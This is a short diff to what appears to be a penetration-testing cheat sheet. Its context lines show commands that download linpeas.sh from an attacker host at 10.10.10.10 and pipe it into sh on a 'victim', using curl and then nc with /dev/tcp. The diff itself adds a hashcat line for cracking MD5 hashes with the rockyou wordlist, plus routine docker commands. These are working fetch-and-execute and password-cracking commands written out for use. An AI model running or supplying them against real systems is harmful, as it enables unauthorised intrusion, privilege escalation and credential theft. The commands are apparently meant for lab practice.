@@ -34,3 +34,12 @@ curl 10.10.10.10/linpeas.sh | sh #Victim
 ## Without curl
 sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
 cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+
+
+## hashcat basic
+hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
+
+
+## docker folder - build with dockerfile
+sudo docker build -t dockername . 
+sudo docker run -it -v $(pwd):/app dockername
